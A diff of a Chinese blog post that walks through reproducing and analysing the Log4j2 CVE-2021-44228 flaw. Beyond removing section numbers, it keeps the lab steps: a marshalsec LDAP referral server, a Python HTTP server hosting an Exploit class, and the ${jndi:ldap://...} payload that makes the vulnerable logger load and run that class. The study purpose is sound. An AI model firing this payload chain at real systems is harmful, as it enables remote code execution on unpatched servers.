@@ -4,27 +4,26 @@ date: '2022/1/22 20:29:01'
 categories:
   - - 漏洞复现
 description: Apache Log4j2 (cve-2021-44228) 漏洞复现和分析
-abbrlink: f51ae902
 tags:
 ---
 
 # Apache log4j2 (CVE-2021-44228)漏洞复现与分析
 
-## 1 漏洞介绍
+## 漏洞介绍
 
-### 1.1 Apache Log4j2 简述
+### Apache Log4j2 简述
 Apache Log4j2 是一款优秀的Java日志框架，该工具重写了Log4j框架，并且引入了大量新的特性。
 
-### 1.2 漏洞简述
+### 漏洞简述
 由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。而且因为该组件广泛应用在Java程序中，影响范围极大。
 
-### 1.3 漏洞影响
+### 漏洞影响
 本次漏洞影响的产品版本包括：Apache Log4j2 2.0 - 2.15.0-rc1，利用该漏洞，攻击者能够在未授权的情况下远程执行代码。
 
 
-## 2 漏洞复现流程
+## 漏洞复现流程
 
-### 2.1 环境配置
+### 环境配置
 
 适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前
 
@@ -32,11 +31,11 @@ Apache Log4j2 是一款优秀的Java日志框架，该工具重写了Log4j框�
 
 > 这里使用的是jdk-8u144环境进行演示
 
-### 2.2 创建一个maven项目，并导入log4j的依赖包
+### 创建一个maven项目，并导入log4j的依赖包
 
 > 创建maven项目时候，选择SDK为jdk-8u144
 
-#### 2.2.1 修改Pom.xml文件
+#### 修改Pom.xml文件
 ```Pom.xml```中代码如下
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -68,7 +67,7 @@ Apache Log4j2 是一款优秀的Java日志框架，该工具重写了Log4j框�
 </project>
  ```
 
-#### 2.2.2 新建exp.java文件
+#### 新建exp.java文件
 ```exp.java```的代码如下
 ```java
 import org.apache.logging.log4j.LogManager;
@@ -81,7 +80,7 @@ class LogTest {
 }
  ```
 
-#### 2.2.3 新建poc.java文件
+#### 新建poc.java文件
 ```poc.java```的代码如下
 ```java
 import org.apache.logging.log4j.LogManager;
@@ -94,14 +93,14 @@ class LogTest {
 }
  ```
 
-#### 2.2.4 编译exp.java
+#### 编译exp.java
 在```.\src\test\java\```目录下进行编译，得到exp.class
 ```shell
 cd .\src\test\java\
 javac exp.java
 ```
 
-#### 2.2.5 借助反序列化利用工具marshalsec
+#### 借助反序列化利用工具marshalsec
 接下来需要用到java的反序列化利用工具marshalsec，直接从github上面clone下来，利用命令行cmd
 ```shell
 git clone https://github.com/mbechler/marshalsec.git
@@ -113,35 +112,35 @@ mvn clean package -DskipTests
 java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit" 8888
 ```
 
-#### 2.2.6 启动HTTP Server
+#### 启动HTTP Server
 然后在Exlpoit.class文件的目录下启动命令行cmd，利用Python启动一个HTTP Server
 ```shell
 python -m http.server 8000
 ```
 
-#### 2.2.7 运行poc.java
+#### 运行poc.java
 结果如下，可以看到成功的执行了弹出计算器的语句
 ![img](https://testingcf.jsdelivr.net/gh/black-and-while/website_save_images/vulnerability_recurrence/java_log4j2/result.png)
 
-#### 2.2.8 整个项目的目录情况
+#### 整个项目的目录情况
 ![img](https://testingcf.jsdelivr.net/gh/black-and-while/website_save_images/vulnerability_recurrence/java_log4j2/file_directory.png)
 
 
-## 3 原理分析
+## 原理分析
 
-### 3.1 JNDI注入
+### JNDI注入
 
-#### 3.1.1 原理
+#### 原理
 
 将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行
 
-#### 3.1.2 利用条件
+#### 利用条件
 
 （1）客户端的lookup()方法的参数可控
 （2）服务端在使用Reference时，classFactoryLocation参数可控
 > 二者满足一个即可
 
-### 3.2 漏洞利用流程分析
+### 漏洞利用流程分析
 
 因为最后执行命令在```exp.java```的```Runtime.getRuntime().exec(cmds);```中，因此在这里下一个断点
 
@@ -201,7 +200,7 @@ main:6, LogTest
 
 ![img](https://testingcf.jsdelivr.net/gh/black-and-while/website_save_images/vulnerability_recurrence/java_log4j2/principle2.png)
 
-### 3.2 漏洞利用总结
+### 漏洞利用总结
 
 （1）在```poc.java```中，运行到```logger.error("${jndi:ldap://localhost:8888/Exploit}");```时候，log4j发现了```${}```，对里面的信息要进行单独处理
 （2）进一步解析后发现是JNDI扩展，然后再进一步解析发现是LDAP协议，然后去请求```localhost:8888/Exploit```的数据，但是请求的可能是恶意的数据
